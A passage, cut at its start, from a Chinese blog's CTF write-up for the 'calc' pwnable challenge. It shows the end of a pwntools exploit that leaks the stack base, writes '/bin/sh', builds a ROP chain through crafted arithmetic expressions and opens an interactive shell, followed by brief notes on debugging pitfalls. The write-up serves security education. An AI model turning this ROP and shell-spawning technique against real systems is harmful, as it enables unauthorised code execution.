+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;-1*</span><span class=si>%d</span><span class=s2>+</span><span class=si>%d</span><span class=s2>+</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=o>-</span><span class=n>n</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=mh>0x80000000</span> <span class=o>+</span> <span class=n>n</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=mh>0x80000000</span> <span class=o>+</span> <span class=n>n</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;-1*</span><span class=si>%d</span><span class=s2>-1*</span><span class=si>%d</span><span class=s2>-1*</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>n</span><span class=p>[</span><span class=mi>5</span><span class=p>],</span> <span class=n>n</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>n</span><span class=p>[</span><span class=mi>7</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_shell</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;illegal&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pwn</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;----------begin-----------&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>leak_ebp</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>write_binsh</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ROP</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>get_shell</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=o>.</span><span class=n>wait_for_close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;-----------end------------&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Challenge</span><span class=p>(</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>pwn</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>写 <code>exp</code> 最后 debug 的时候有以下的几个坑点：</p><ol><li>我们利用乘法优先级比较高的特性，可以构造 <code>1*addr</code> 这样的表达式将上面的地址全部按顺序压入栈中。但是问题是 <code>adstr</code> 是一个负数，用这种方式压栈会出现表达式错误（<code>*-</code> 两个运算符同时出现）。</li><li><code>/bin/sh</code> 这个字符串不能写在 <code>calc</code> 这个函数的局部变量区，因为每次循环时会被初始化。</li></ol></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 0001-01-01</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/3.calc/ data-title><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/3.calc/><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/3.calc/ data-title data-ralateuid=3968720593><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/ctf-writeup/pwnable/4.3x17/ class=prev rel=prev title><i class="fas fa-angle-left fa-fw" aria-hidden=true></i></a>
+<a href=/posts/ctf-writeup/pwnable/2.orw/ class=next rel=next title><i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://shesl-meow.github.io target=_blank>佘崧林</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{valine:{appId:"zDVJohJIQbD6f3W267xtaYRC-gzGzoHsz",appKey:"ewsfU9ocNOeuvt0MzONe6yKx",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-CN",pageSize:10,placeholder:"你的评论 ...",recordIP:!0,serverURLs:"https://zdvjohji.lc-cn-n1-shared.com",visitor:!0}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"",algoliaIndex:"",algoliaSearchKey:"",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.c1d5acc03abc8af9ee0a42aa4e942566a338a3e29d21b6c9f11536101f6914ad.js integrity="sha256-wdWswDq8ivnuCkKqTpQlZqM4o+KdIbbJ8RU2EB9pFK0="></script></body></html>
